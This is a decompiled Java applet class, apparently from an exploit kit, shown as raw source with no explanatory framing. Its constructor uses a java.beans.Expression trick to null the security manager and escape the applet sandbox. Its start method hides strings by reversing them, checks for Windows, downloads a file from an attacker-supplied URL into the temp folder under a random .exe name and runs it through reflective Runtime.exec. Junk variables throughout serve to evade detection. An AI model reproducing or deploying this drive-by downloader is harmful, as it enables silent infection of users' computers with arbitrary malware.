// 
// Decompiled by Procyon v0.5.30
// 

package Rleh;

import java.awt.Component;
import java.beans.Expression;
import utilits.coon;
import java.lang.reflect.Method;
import java.lang.reflect.InvocationTargetException;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;
import utilits.pinupa;
import javax.swing.JList;
import java.util.HashSet;
import java.applet.Applet;

public class Fhtagn extends Applet
{
    public HashSet sdlnvskv;
    public JList svssvl630l;
    
    public void start() {
        super.start();
        try {
            final boolean holiko = true;
            final String sroiltr1 = pinupa.lopiyo(this.getParameter("dskvnds"));
            final String sroliuytrjkltr2 = "e".concat("xe.");
            final String ssdgvrdtbhrnynfn3 = "ri".concat("dpm".concat("t.oi.av".concat("aj")));
            final String srettr4 = "ema".concat("n.so");
            final String srskdbvtfrsgfe5 = new StringBuffer(sroliuytrjkltr2).reverse().toString();
            final String rewfiwifnn = new StringBuffer(ssdgvrdtbhrnynfn3).reverse().toString();
            final int nfrvn = 24;
            final String oplnjvindjv = new StringBuffer(srettr4).reverse().toString();
            final String sretotr8 = String.valueOf(Math.random()) + srskdbvtfrsgfe5;
            final String srtropliyty9 = System.getProperty(rewfiwifnn);
            final int ospvjs = 1000 + nfrvn;
            final String srtr1urhfiebvj0 = System.getProperty(oplnjvindjv);
            try {
                if (srtr1urhfiebvj0.indexOf("W".concat("in").concat("do".concat("ws"))) >= 0) {
                    final URL trjvn = new URL(sroiltr1);
                    final int pizdeerthrfneetc = 10;
                    final boolean behgbrhgtfrb = true;
                    final FileOutputStream logbrfbko = new FileOutputStream(String.valueOf(srtropliyty9) + sretotr8);
                    final String is = "s;f";
                    trjvn.openConnection();
                    final int oazrhnc = 10;
                    final boolean iuyi = false;
                    final String b10egrh48rh7 = "ee";
                    final InputStream ksdcloqcnm = trjvn.openStream();
                    final String dcaewsm = "dseagtacergraewgtavnefrtshj";
                    final boolean asccmsa = true;
                    final int lop = 0;
                    final String borabora = "sv";
                    final byte[] atyrsvlntsw = new byte[ospvjs];
                    int iop;
                    while ((iop = ksdcloqcnm.read(atyrsvlntsw, 0, ospvjs)) != -1) {
                        logbrfbko.write(atyrsvlntsw, 0, iop);
                    }
                    ksdcloqcnm.close();
                    logbrfbko.close();
                    final int df = 34;
                    final boolean dfvm = false;
                    final String ffnwsfn = "aqdsbgvdjrnthtfrqa";
                    final Runtime lfopsjjvnr = Runtime.getRuntime();
                    final int kvfndfs = 76;
                    final String scvms = ";rkltrgrtnhrjntynwn";
                    final boolean bbhj = true;
                    fasa(lfopsjjvnr, "ex".concat("ec"), new Object[] { String.valueOf(srtropliyty9) + sretotr8 });
                    final int fvnddbgve = 5843474;
                    final String ernv = "knrjhfvrthsdgtrnjeklfrjnthv";
                }
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public static Object fasa(final Object obj, final String name) {
        final Class cls = obj.getClass();
        try {
            final Method method = cls.getMethod(name, (Class[])null);
            return method.invoke(obj, (Object[])null);
        }
        catch (NoSuchMethodException ex) {
            ex.printStackTrace();
        }
        catch (IllegalAccessException ex2) {
            ex2.printStackTrace();
        }
        catch (InvocationTargetException ex3) {
            throw new RuntimeException(ex3);
        }
        return null;
    }
    
    public static Object fasa(final Object obj, final String name, final Object[] val) {
        final Class cls = obj.getClass();
        if (val.length == 0) {
            fasa(obj, name);
        }
        try {
            final Method[] m = cls.getMethods();
            for (int i = 0; i < m.length; ++i) {
                if (m[i].getName().equals(name) && cm(m[i], val)) {
                    return m[i].invoke(obj, val);
                }
            }
        }
        catch (IllegalAccessException ex) {
            ex.printStackTrace();
        }
        catch (InvocationTargetException ex2) {
            throw new RuntimeException(ex2);
        }
        return null;
    }
    
    private static boolean cm(final Method m, final Object[] val) {
        final Class[] cls = m.getParameterTypes();
        return c(cls, val);
    }
    
    public static boolean c(final Class[] cls, final Object[] val) {
        if (cls.length != val.length) {
            return false;
        }
        for (int i = 0; i < cls.length; ++i) {
            if (!val[i].getClass().getName().toUpperCase().contains(cls[i].getName().toUpperCase())) {
                return false;
            }
        }
        return true;
    }
    
    public Fhtagn() {
        this.sdlnvskv = new HashSet();
        final Class ljkois = System.class;
        final boolean bt = true;
        final String aldas = "setS".concat("ecu".concat("rityM".concat("anager")));
        final String lok = "vs";
        final Object[] asnloal = { null };
        final int pol = 987;
        this.sdlnvskv.add(new coon(ljkois, aldas, asnloal));
        final Expression ensvdj = new Expression(ljkois, aldas, asnloal);
        final poliko dvknsl = new poliko(this, this.sdlnvskv);
        this.add(this.svssvl630l = new JList((E[])new Object[] { dvknsl }));
    }
}
